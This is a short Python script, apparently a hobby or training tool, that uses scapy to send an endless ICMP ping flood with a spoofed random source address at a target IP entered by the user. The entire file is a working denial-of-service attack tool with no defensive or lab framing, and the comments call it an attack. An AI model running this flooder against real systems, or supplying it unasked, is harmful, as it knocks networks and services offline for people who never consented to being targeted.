import random
from scapy.all import *
from scapy.layers.inet import ICMP


# Generates random IP to assign to the source
def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


# function -- PING flood / ICMP flood attack using ICMP
def ICMP_flood(targetIP):
    try:

        pkt_count = 500
        total = 0
        source_ip = randomIP()
        while True:
            send(IP(src=source_ip, dst=targetIP) / ICMP(), verbose=0)
            total += 1
            print("\nTotal packets sent: %i" % total)


    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        print("[+] Ping flood Stopped")


if __name__ == "__main__":
    Targetip = input("\nEnter the target IP : ")
    ICMP_flood(Targetip)

